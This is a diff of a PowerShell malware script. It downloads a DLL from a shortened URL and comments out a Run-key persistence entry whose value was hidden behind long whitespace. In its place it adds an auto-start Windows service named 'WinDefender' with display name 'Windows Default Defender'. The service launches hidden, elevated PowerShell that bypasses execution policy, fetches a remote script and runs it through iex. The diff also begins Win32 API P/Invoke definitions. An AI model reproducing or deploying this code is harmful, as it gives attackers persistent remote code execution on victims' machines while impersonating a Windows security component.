@@ -9,11 +9,22 @@ if (-not (Test-Path -Path $dllPath)) {
     $dllUrl = "https://tinyurl.com/2s35eutk"
     
     Invoke-WebRequest -Uri $dllUrl -OutFile "$dllPath" -UseBasicP -ErrorAction Stop
-    New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
-        -Name "WinDefender" `
-        -Value "                                                                                                                                                                                                                                                                                 powershell -Command `"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri $scriptPath -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden`""`
-        -PropertyType String -Force
+
+
+    # New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    #     -Name "WinDefender" `
+    #     -Value "powershell -Command `"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri $scriptPath -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden`""`
+    #     -PropertyType String -Force
 }
+
+# Create a Windows service that runs a custom command
+$serviceName = "WinDefender"
+$binPath = "C:\Windows\system32\cmd.exe /c powershell -Command `"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri $scriptPath -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden`""
+$startType = "auto"
+$displayName = "Windows Default Defender"
+
+# Create the service
+sc.exe create $serviceName binPath= $binPath start= $startType DisplayName= $displayName
 
 # Define necessary Win32 API functions via P/Invoke
 $signature = @"
